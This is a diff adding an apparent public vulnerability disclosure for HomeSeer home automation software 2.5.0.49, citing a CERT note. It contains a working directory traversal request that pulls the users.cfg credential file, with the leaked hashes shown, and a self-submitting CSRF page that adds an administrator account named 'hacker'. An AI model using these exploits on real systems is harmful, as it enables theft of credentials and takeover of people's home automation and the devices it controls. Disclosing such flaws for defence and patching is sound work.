@@ -1,0 +1,42 @@
+# HomeSeer Home Automation Software Multiple Web Vulnerabilities (0day)
+# Date: 3/6/12
+# Author: Silent_Dream
+# Software Link: http://www.homeseer.com/pub/setuphs2_5_0_49.exe
+# Version: 2.5.0.49
+# Tested on: Win XP
+# CERT VU#796883: http://www.kb.cert.org/vuls/id/796883
+#Note: This affects both HomeSeer HS2 and HomeSeer PRO.  
+#Previously reported XSS attack vector (elog) reported to CERT was fixed in 2.5.0.49 update.
+
+A) Directory Traversal: Retrieving the users.cfg file which contains HomeSeer usernames, access levels, and encrypted passwords.
+
+ncat 192.168.0.1 80
+GET /..\Config\users.cfg HTTP/1.0
+
+HTTP/1.0 200 OK
+Server: HomeSeer
+Content-Type: application/
+Accept-Ranges: bytes
+Content-Length: 195
+
+2
+EFBBBF6775657374,EFBBBF4853454E4332774B51364D614C53436D534D41697A48617450514D513
+D3D,EFBBBF31
+EFBBBF64656661756C74,EFBBBF4853454E43327A68336A307A412F585153776F7032575A54534E6
+3773D3D,EFBBBF36
+
+B) Cross-Site Request Forgery: It is possible to add a new admin user by tricking logged-in admin to visit a malicious URL.
+This POC adds user "hacker" with pass "hacked" as a HomeSeer admin.
+
+ <html>
+ <body onload="javascript:document.forms[0].submit()">
+ <H2>HomeSeer CSRF Exploit to add new administrator account</H2>
+ <form method="POST" name="form0" action="http://localhost/ctrl ">
+ <input type="hidden" name="wuNEWUSERNAME" value="hacker"/>
+ <input type="hidden" name="wuNEWUSERPASS" value="hacked"/>
+ <input type="hidden" name="wuNEWUSERRIGHTS" value="Admin"/>
+ <input type="hidden" name="wuNEWUSERADD" value="Add"/>
+ <input type="hidden" name="stay_on_webusers" value="Hello"/>
+ </form>
+ </body>
+ </html>
